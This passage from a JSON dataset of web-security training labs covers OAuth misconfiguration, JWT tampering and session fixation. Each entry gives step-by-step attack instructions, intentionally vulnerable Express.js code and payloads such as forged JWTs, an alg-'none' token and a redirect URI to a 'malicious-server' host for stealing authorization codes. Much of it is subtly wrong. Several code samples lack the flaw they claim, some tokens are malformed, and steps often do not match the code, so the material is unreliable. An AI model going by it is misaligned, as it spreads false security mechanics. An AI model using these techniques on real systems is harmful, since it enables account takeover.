    "Lab scenario": "OAuth misconfiguration with excessive scopes",
    "Lab Description": "This lab features a vulnerable OAuth implementation where a user can request excessive permissions (scopes) during authorization. The OAuth provider does not properly restrict these scopes. To solve the lab, you need to exploit the OAuth misconfiguration to gain access to Carlos’s account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Begin by launching an OAuth authorization flow with your own credentials.",
      "2. Capture the OAuth authorization request in Burp Suite and examine the scope parameter.",
      "3. Modify the scope parameter to include additional permissions that should not be available.",
      "4. Complete the OAuth authorization flow and retrieve the access token.",
      "5. Use the access token to access Carlos’s account by making API requests with the escalated permissions."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; const oauthClients = [{ clientId: 'abc123', clientSecret: 'secret', redirectUri: 'http://localhost/callback' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, scope } = req.query; if (oauthClients.find(c => c.clientId === client_id)) { const authCode = 'authorization-code'; res.redirect(`${req.query.redirect_uri}?code=${authCode}`); } else { res.status(400).send('Invalid client'); } }); app.post('/oauth/token', (req, res) => { const { client_id, code, redirect_uri } = req.body; if (oauthClients.find(c => c.clientId === client_id)) { const token = 'access-token-with-permission'; res.json({ access_token: token, scope: 'read write' }); } else { res.status(400).send('Invalid client'); } }); app.get('/my-account', (req, res) => { res.send('Welcome carlos'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
    "payloads": [
      "client_id=abc123&scope=read write admin",
      "Authorization: Bearer access-token-with-permission"
    ]
  },
  {
    "Lab scenario": "JWT token manipulation in REST API",
    "Lab Description": "This lab contains a RESTful API with JWT-based authentication. The application does not correctly validate the JWT, allowing for tampering with token data. To solve the lab, manipulate the JWT to access Carlos's admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the login request with Burp Suite and obtain the JWT token sent upon successful authentication.",
      "2. Decode the JWT using a base64 decoder to examine the payload, which includes the user roles.",
      "3. Modify the 'role' field from 'user' to 'admin' in the payload and re-encode the token.",
      "4. Replace the original JWT token in the 'Authorization' header of the request with the modified token.",
      "5. Send the modified request to the server and access the admin panel by visiting the admin URL."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\n\nconst users = [{ username: 'carlos', password: 'password123' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    const token = jwt.sign({ username: user.username, role: 'user' }, 'secretkey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token) {\n    jwt.verify(token, 'secretkey', (err, decoded) => {\n      if (err || decoded.role !== 'admin') {\n        res.status(403).send('Access denied');\n      } else {\n        res.send('Welcome to the admin panel');\n      }\n    });\n  } else {\n    res.status(401).send('Token missing');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "OAuth misconfiguration in third-party integration",
    "Lab Description": "This lab involves an OAuth2-based authentication system integrated with a third-party service. The application is vulnerable due to improper scope and client ID validation. To solve the lab, bypass the OAuth scope restrictions to access admin functionality.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Initiate the OAuth authorization process and obtain the access token using valid credentials.",
      "2. Intercept the OAuth request and examine the authorization URL for incorrect scope or improper client ID.",
      "3. Modify the 'scope' parameter to include 'admin' and use a valid client ID.",
      "4. Exchange the modified authorization code for an access token.",
      "5. Use the new access token to send requests to the admin endpoints and bypass the restrictions."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\napp.use(express.json());\n\napp.get('/oauth/authorize', (req, res) => {\n  res.send('<form action=\"/oauth/token\" method=\"post\"><input type=\"text\" name=\"code\"><button>Exchange Code</button></form>');\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { code, client_id, scope } = req.body;\n  if (client_id === 'valid-client-id' && scope.includes('admin')) {\n    res.json({ access_token: 'admin-token' });\n  } else {\n    res.status(400).send('Invalid scope or client ID');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token === 'admin-token') {\n    res.send('Welcome to the admin dashboard');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('OAuth Misconfig Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "Session fixation vulnerability in SOAP API",
    "Lab Description": "This lab involves a SOAP-based authentication API where the session ID is not properly regenerated upon login. The session ID remains fixed, allowing for session fixation attacks. To solve the lab, fix the session ID and access Carlos's account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Intercept the login request to the SOAP service with Burp Suite and note the session ID provided in the response.",
      "2. Log out and modify the session ID in the subsequent login request to match the previous session ID.",
      "3. Send the modified login request and observe that the server does not regenerate the session ID, logging you into Carlos's account.",
      "4. Access Carlos's account and solve the lab by visiting the 'My account' page."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = [{ username: 'carlos', password: 'password123', session: 'session123' }];\n\napp.post('/login', (req, res) => {\n  const { username, password, session } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    user.session = session || 'session123';\n    res.send(`Logged in with session ${user.session}`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/my-account', (req, res) => {\n  const session = req.query.session;\n  const user = users.find(u => u.session === session);\n  if (user) {\n    res.send(`Welcome ${user.username}`);\n  } else {\n    res.status(401).send('Invalid session');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('SOAP Session Fixation Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "JWT Token Manipulation for Unauthorized Access",
    "Lab Description": "This lab's JWT-based authentication mechanism is vulnerable to token manipulation. The application does not verify the integrity of the JWT token and allows unauthorized access by altering the claims. To solve this lab, you need to access a restricted page by manipulating the JWT token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Using Burp Suite, intercept the login request and obtain the JWT token from the response.",
      "2. Decode the JWT token using an online tool or Burp Suite's built-in decoder to view the payload.",
      "3. Identify the 'role' claim in the payload and modify it to an admin role.",
      "4. Re-encode the token and replace the original JWT token in the Authorization header of the request.",
      "5. Send the modified request to access the admin page and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secretKey = 'mySecretKey'; const users = [{ username: 'user1', password: 'password1', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, secretKey, { expiresIn: '1h' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(403).send('No token provided'); jwt.verify(token, secretKey, (err, decoded) => { if (err) return res.status(401).send('Unauthorized'); if (decoded.role === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access denied'); } }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Manipulation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6ImFkbWluIn0.YGv4hTyLg3vZTrqD4H5UtYqaE5dzzAGy",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6ImFkbWluIn0.XzDqz18m5Hp-MHK-ztfFSb-y_Ma2dq3k"
    ]
  },
  {
    "Lab scenario": "Session Fixation Attack via Manipulated Session ID",
    "Lab Description": "This lab contains a session management vulnerability where the session ID is set prior to authentication. An attacker can exploit this by manipulating the session ID before login to gain unauthorized access. To solve the lab, you need to log into Carlos’s account by fixing the session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Using Burp Suite, intercept the login request and note the session cookie that is set before authentication.",
      "2. Manually modify the session cookie to the session ID of Carlos’s account.",
      "3. Send the request to the server with the fixed session ID.",
      "4. The server should authenticate the request with the fixed session ID and log you into Carlos's account.",
      "5. Access Carlos’s account page to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: { password: 'password123', session: 'carlosSession' }, admin: { password: 'admin123', session: 'adminSession' } }; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users[username]; if (user && user.password === password) { res.cookie('session', user.session); res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/account', (req, res) => { const session = req.cookies.session; const user = Object.keys(users).find(u => users[u].session === session); if (user) { res.send('Welcome ' + user); } else { res.send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "session=carlosSession",
      "session=adminSession"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration Leading to Privilege Escalation",
    "Lab Description": "This lab demonstrates an OAuth misconfiguration where the application grants elevated permissions based on a misconfigured authorization server. The attacker can exploit this misconfiguration to escalate privileges. To solve this lab, you need to obtain admin-level access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to initiate the OAuth authorization flow by sending a request to the authorization endpoint.",
      "2. Analyze the response from the authorization server and extract the authorization code.",
      "3. Exchange the authorization code for an access token and note the associated scope in the token's payload.",
      "4. Using the access token, send a request to the application's API and attempt to access a restricted admin endpoint.",
      "5. Modify the token’s scope claim to include the 'admin' scope and reissue the request to escalate privileges and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const oauthConfig = { clientId: 'client123', clientSecret: 'secret456', authUrl: 'https://oauth-server.com/authorize', tokenUrl: 'https://oauth-server.com/token' }; const users = { user1: { role: 'user' }, admin: { role: 'admin' } }; app.post('/login', (req, res) => { const { username, password, code } = req.body; if (username === 'user1' && password === 'password1') { res.json({ access_token: 'token123', scope: 'user' }); } else if (username === 'admin' && password === 'admin123') { res.json({ access_token: 'adminToken', scope: 'admin' }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (token === 'adminToken') { res.send('Welcome Admin'); } else { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Authorization: Bearer token123",
      "Authorization: Bearer adminToken"
    ]
  },
  {
    "Lab scenario": "JWT Token Manipulation for Unauthorized Access",
    "Lab Description": "In this lab, the application improperly validates JWT tokens for authorization. While logged in, the JWT token is exposed to manipulation and can be used to escalate privileges. The goal is to manipulate the token to gain admin access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the JWT token sent in the Authorization header during login.",
      "2. Analyze the token's structure and identify the claims (e.g., user role).",
      "3. Modify the 'role' claim in the JWT token to 'admin' and re-encode the token.",
      "4. Send the modified JWT token in the Authorization header to access the /admin page.",
      "5. Verify that access to the admin page is granted, confirming the exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'user', password: 'password', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secretkey'); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(401).send('Unauthorized'); jwt.verify(token, 'secretkey', (err, decoded) => { if (err || decoded.role !== 'admin') return res.status(403).send('Forbidden'); res.send('Admin access granted'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Token Manipulation Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "Authorization: Bearer <modified-jwt-token>"
    ]
  },
  {
    "Lab scenario": "Session Fixation Vulnerability in Login Flow",
    "Lab Description": "This lab demonstrates a session fixation vulnerability in the login flow. The application does not regenerate the session ID after a successful login, allowing an attacker to set a session ID and hijack the victim's session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Using Burp Suite, intercept the POST /login request and note the session ID set in the cookies.",
      "2. Manually modify the session ID to a custom value and send the request to the server.",
      "3. Perform a login attempt with valid credentials while the modified session ID is set in the cookies.",
      "4. Access the /account page using the modified session ID and confirm successful authentication.",
      "5. Verify that the attacker gains access to the victim's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = [{ username: 'victim', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = user.username; res.send('Logged in successfully'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.username) { res.send('Account details for ' + req.session.username); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "Cookie: session=<fixed-session-id>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration Leading to Account Takeover",
    "Lab Description": "This lab involves an OAuth misconfiguration in a third-party service that allows an attacker to hijack the authorization process and gain unauthorized access to the victim's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify the OAuth flow by observing the /auth endpoint during the login process.",
      "2. Use Burp Suite to capture the redirect URI after the OAuth authentication process.",
      "3. Modify the redirect URI to point to a malicious server controlled by the attacker.",
      "4. Intercept the authorization code and exchange it for an access token using the OAuth token endpoint.",
      "5. Use the access token to impersonate the victim and gain access to their account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const { OAuth2Client } = require('google-auth-library'); const app = express(); const client = new OAuth2Client('client-id', 'client-secret'); app.get('/auth', (req, res) => { const redirectUri = 'http://localhost:4000/callback'; const authUrl = client.generateAuthUrl({ scope: 'https://www.googleapis.com/auth/userinfo.profile', redirect_uri: redirectUri }); res.redirect(authUrl); }); app.get('/callback', (req, res) => { const { code } = req.query; client.getToken(code, (err, tokens) => { if (err) return res.status(400).send('Error exchanging code for token'); res.send('Access token obtained: ' + tokens.access_token); }); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "Authorization Code: <hijacked-authorization-code>",
      "Redirect URI: http://malicious-server/callback"
    ]
  },
  {
    "Lab scenario": "Session Fixation via URL manipulation",
    "Lab Description": "This lab demonstrates a session fixation vulnerability where an attacker can force a user to authenticate with a session ID of their choice. The session is fixed before login and cannot be reset after authentication. To solve this lab, hijack the victim's session and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in to your account and note the session ID set in the response cookie.",
      "2. Use Burp Suite to intercept the login request and modify the session cookie to a predetermined value.",
      "3. Log out of your account and log in with the victim's credentials, using the intercepted session ID.",
      "4. Observe that the victim's session is reused, and access the victim's account page.",
      "5. Confirm the exploit is successful when the victim's account page is loaded."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({ secret: 'secret', resave: true, saveUninitialized: true }));\n\nlet users = [{ username: 'victim', password: 'password123' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    req.session.user = user;\n    res.send('Logged in');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/account', (req, res) => {\n  if (req.session.user) {\n    res.send('Account details for ' + req.session.user.username);\n  } else {\n    res.status(401).send('Access denied');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "sessionid=fixed-session-id"
    ]
  },
  {
    "Lab scenario": "JWT Tampering for Privilege Escalation",
    "Lab Description": "In this lab, the application improperly validates JWT tokens, allowing attackers to tamper with the payload and escalate their privileges. The goal is to modify the JWT to escalate your privileges to admin and access the restricted admin page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Log in with a regular user account and capture the JWT token sent in the Authorization header.",
      "2. Decode the JWT token using a tool like jwt.io to reveal the payload.",
      "3. Modify the payload's role field to 'admin' and re-encode the JWT token.",
      "4. Replace the original JWT token in your requests with the modified token.",
      "5. Access the restricted admin page, confirming successful privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = [{ username: 'user', password: 'userpassword', role: 'user' }];\nconst secret = 'secretkey';\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    const token = jwt.sign({ username: user.username, role: user.role }, secret);\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  jwt.verify(token, secret, (err, decoded) => {\n    if (err || decoded.role !== 'admin') {\n      return res.status(403).send('Access denied');\n    }\n    res.send('Admin dashboard');\n  });\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:' + PORT));",
    "payloads": [
      "header: { 'alg': 'HS256', 'typ': 'JWT' }",
      "payload: { 'username': 'user', 'role': 'admin' }",
      "signature: <generated signature after re-encoding>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration for Token Leakage",
    "Lab Description": "This lab demonstrates an OAuth misconfiguration where the client inadvertently exposes an authorization code to an attacker. To solve the lab, intercept and reuse the exposed authorization code to obtain an access token and access the victim's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Trigger the OAuth login flow by clicking the 'Log in with OAuth' button.",
      "2. Use Burp Suite to intercept the authorization code sent to the client after a successful OAuth authentication.",
      "3. Extract the authorization code from the intercepted request.",
      "4. Exchange the authorization code for an access token by sending a POST request to the token endpoint.",
      "5. Use the obtained access token to access the victim's account page."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\napp.get('/auth', (req, res) => {\n  res.redirect('https://oauth.provider.com/authorize?response_type=code&client_id=client-id&redirect_uri=http://localhost:4000/callback');\n});\n\napp.get('/callback', async (req, res) => {\n  const code = req.query.code;\n  const response = await axios.post('https://oauth.provider.com/token', {\n    code: code,\n    client_id: 'client-id',\n    client_secret: 'client-secret',\n    redirect_uri: 'http://localhost:4000/callback'\n  });\n  res.json({ access_token: response.data.access_token });\n});\n\napp.get('/my-account', (req, res) => {\n  res.send('Account details for user');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
    "payloads": [
      "code=<extracted authorization code>",
      "access_token=<obtained access token>"
    ]
  },
  {
    "Lab scenario": "JWT Token Manipulation in Authorization Header",
    "Lab Description": "This lab's JWT authentication can be bypassed by tampering with the token in the Authorization header. The token is being sent with the 'Bearer' prefix in the request header. To solve the lab, you need to manipulate the JWT token to impersonate the 'admin' user and access their dashboard page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the login request using Burp Suite.",
      "2. Capture the JWT token from the Authorization header.",
      "3. Decode the JWT token and analyze its payload to locate the user role.",
      "4. Modify the 'role' field from 'user' to 'admin' and re-encode the JWT.",
      "5. Replace the old JWT token in the Authorization header with the newly crafted one and resend the request.",
      "6. If successful, you should gain access to the 'admin' dashboard, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst secretKey = 'your_secret_key';\n\nconst users = [{ username: 'user', password: 'user123', role: 'user' }, { username: 'admin', password: 'admin123', role: 'admin' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    const token = jwt.sign({ username: user.username, role: user.role }, secretKey, { expiresIn: '1h' });\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin-dashboard', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token) {\n    jwt.verify(token, secretKey, (err, decoded) => {\n      if (err || decoded.role !== 'admin') {\n        return res.status(403).send('Forbidden');\n      }\n      res.send('Admin Dashboard');\n    });\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Manipulation Lab running on http://localhost:${PORT}'));"
  },
  {
    "Lab scenario": "Session Fixation in Login Process",
    "Lab Description": "This lab is vulnerable to session fixation, where the session ID is set by the attacker and not regenerated after login. To solve the lab, you need to fix the session ID and use it to authenticate as Carlos after he logs in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Start by logging in to your own account and obtain the session ID from the 'Set-Cookie' response header.",
      "2. Log out of your account and note the session cookie set on the browser.",
      "3. Manually set the session cookie to the value obtained earlier from Carlos's session.",
      "4. Login as Carlos with valid credentials, but ensure that the session cookie from step 2 is maintained.",
      "5. Once Carlos's session is established, access his account page to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst users = [{ username: 'carlos', password: 'password123', sessionId: 'abcd1234' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    res.cookie('sessionId', user.sessionId);\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/account', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  const user = users.find(u => u.sessionId === sessionId);\n  if (user) {\n    res.send('Account details for carlos');\n  } else {\n    res.send('Access denied');\n  }\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log('Session Fixation Lab running on http://localhost:${PORT}');\n});"
  },
  {
    "Lab scenario": "Broken OAuth Flow in External API",
    "Lab Description": "This lab demonstrates a broken OAuth flow where the application doesn't properly validate the 'state' parameter in the OAuth redirect. To solve the lab, you need to intercept the OAuth callback request and modify the 'state' parameter to gain unauthorized access to the user account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the OAuth authorization request using Burp Suite and capture the URL sent to the OAuth provider.",
      "2. Observe the 'state' parameter in the URL and take note of its value.",
      "3. After authorization, intercept the callback response from the OAuth provider and locate the 'state' parameter in the redirect URL.",
      "4. Modify the 'state' parameter to a value of your choice and resend the request.",
      "5. Upon successful redirection, access the user account page to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst oauthClientId = 'myClientId';\nconst oauthClientSecret = 'myClientSecret';\nconst oauthRedirectUri = 'http://localhost:4000/callback';\n\napp.get('/login', (req, res) => {\n  const state = Math.random().toString(36).substring(7);\n  const authUrl = `https://oauthprovider.com/authorize?client_id=${oauthClientId}&redirect_uri=${oauthRedirectUri}&state=${state}`;\n  res.redirect(authUrl);\n});\n\napp.get('/callback', async (req, res) => {\n  const { code, state } = req.query;\n  if (state !== 'expected-state') {\n    return res.status(403).send('Invalid state parameter');\n  }\n  const response = await axios.post('https://oauthprovider.com/token', { code, client_id: oauthClientId, client_secret: oauthClientSecret, redirect_uri: oauthRedirectUri });\n  res.json({ access_token: response.data.access_token });\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('Broken OAuth Flow Lab running on http://localhost:${PORT}'));"
  },
  {
    "Lab scenario": "JWT Signature Bypass",
    "Lab Description": "This lab involves a vulnerable JWT-based authentication system where the server does not properly verify the algorithm used for signing the token. You can exploit this vulnerability to bypass authentication. The lab's goal is to forge a JWT with a different signing algorithm to impersonate a valid user.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept a valid JWT in the login process using Burp Suite.",
      "2. Notice the JWT header indicating the algorithm used for signing (HS256).",
      "3. Decode the JWT and extract the payload and the signature.",
      "4. Modify the algorithm in the JWT header to 'none' and remove the signature part.",
      "5. Send the modified JWT in an authentication request using Postman.",
      "6. Observe the server's response indicating successful login despite invalid signature.",
      "7. Verify the bypass by accessing the protected resources with the forged JWT."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const users = [{ username: 'admin', password: 'password' }]; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'password') { const token = jwt.sign({ username }, 'secretKey', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const token = req.headers['authorization']; jwt.verify(token, 'secretKey', (err, decoded) => { if (err) return res.status(403).send('Forbidden'); res.json({ message: 'Welcome to the dashboard', user: decoded.username }); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Signature Bypass Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "eyJhbGciOiAiTm9uZSI6ICJzdHJpbmciLCJraWQiOiAiYWRtaW4ifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJhbGciOiAiSEMyNTYiOiAiYWRtaW4ifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session Fixation Exploit",
    "Lab Description": "This lab demonstrates a session fixation vulnerability where an attacker can set a session ID for a user before they authenticate. Exploiting this flaw, the attacker can force the application to use their own session ID, gaining unauthorized access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in to the application and intercept the session ID in the response using Burp Suite.",
      "2. Set the session ID manually using Burp's Cookie editor or Postman to an arbitrary value.",
      "3. Log out of the application and send a new login request with the fixed session ID.",
      "4. Observe that the server accepts the fixed session ID and logs the user in.",
      "5. Access the protected resources using the fixed session ID to confirm the exploitation of the vulnerability."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secretKey', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { if (req.query.username === 'admin' && req.query.password === 'password') { req.session.user = 'admin'; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user) { res.send('Welcome ' + req.session.user); } else { res.status(401).send('Access Denied'); } }); const PORT = 3000; app.listen(PORT, () => { console.log('Session Fixation Lab running on http://localhost:${PORT}'); });",
    "payloads": [
      "sessionid=abcd1234",
      "sessionid=fixedsessionid"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration Exploit",
    "Lab Description": "This lab involves a misconfigured OAuth 2.0 authorization flow where the authorization code is exposed in the URL without proper protection. An attacker can intercept the code and use it to gain unauthorized access to the target application.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Observe the OAuth 2.0 login flow and capture the authorization code in the redirect URL using Burp Suite.",
      "2. Notice that the authorization code is not protected and can be easily intercepted in the URL.",
      "3. Use the captured authorization code to request an access token via Postman.",
      "4. Examine the response and extract the access token.",
      "5. Use the access token to access protected resources and verify the exploit.",
      "6. Test the full process using Burp Suite to automate the capture and exploitation of authorization codes."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const oauth = require('simple-oauth2'); const credentials = { client: { id: 'client_id', secret: 'client_secret' }, auth: { tokenHost: 'http://localhost:4000' } }; const oauth2 = oauth.create(credentials); app.get('/login', (req, res) => { const authorizationUri = oauth2.authorizationCode.authorizeURL({ redirect_uri: 'http://localhost:4000/callback', scope: 'read' }); res.redirect(authorizationUri); }); app.get('/callback', (req, res) => { const { code } = req.query; oauth2.authorizationCode.getToken({ code, redirect_uri: 'http://localhost:4000/callback' }).then(result => { const token = oauth2.accessToken.create(result); res.json({ access_token: token.token.access_token }); }); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "authorization_code=code_example",
      "code=interceptedcode"
    ]
  },
  {
    "Lab scenario": "JWT token tampering in authentication",
    "Lab Description": "This lab demonstrates a vulnerability in the handling of JWT tokens. The application uses JWT for session management but does not verify the integrity of the token, making it susceptible to manipulation. To solve the lab, you need to tamper with the JWT token and bypass authentication to access the account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture the JWT token from the Authorization header using Burp Suite's Proxy.",
      "2. Decode the JWT token using a tool like JWT.io to inspect its payload and signature.",
      "3. Modify the 'user' claim in the payload to change the username to 'admin'.",
      "4. Re-encode the JWT token without modifying the signature to simulate token tampering.",
      "5. Send the tampered token in a request to the server and observe the response to ensure successful authentication bypass.",
      "6. Access the account page to solve the lab."
    ],
    "Vulnerability name": "Authentication",
